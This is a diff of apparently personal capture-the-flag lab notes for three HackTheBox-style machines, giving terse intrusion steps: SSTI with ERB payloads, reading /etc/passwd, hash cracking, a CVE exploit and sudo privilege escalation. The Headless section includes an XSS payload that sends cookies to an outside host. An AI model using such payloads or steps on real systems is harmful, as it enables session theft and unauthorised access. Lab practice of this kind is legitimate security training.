@@ -17,7 +17,14 @@ ncat -lvnp 9001 > backup.7z
   login and check the version, search on searchploit then run!
   got the root!
 
-# Headless Machine:
+#v Perfection Machine:
+  check calculator feature on the web, intercept the request and enum with SSTI payloads.
+  find that ERB syntax are allowes and potentially to exploit the machine
+  try ping, and read /etc/passwd, don't forget to encode the script to URL
+  some case, the script need to encode with base64 first. got the shell
+  find db backup file, read using "strings", got the hash SHA-256, crack it using hashcat. got user then root!
+
+#v Headless Machine:
   check dirb, got /support and /dashboard
   /dashboard need admin cookie, add this script to body request: <script>document.location='http://ip/?cookie='+document.cookie</script>
   check /dashboard and replace the admin cookie. got the report with body request
@@ -26,7 +33,7 @@ ncat -lvnp 9001 > backup.7z
   chmod +x initdb.sh
   sudo /usr/bin/syscheck
 
-# Bizness Machine:
+#v Bizness Machine:
   check dirb, got control/login
   get info Ofbiz, framework. Find the CVE then run the exploit.
   priv esc, find SHA on framework/resource/templates and runtime/data/derby database
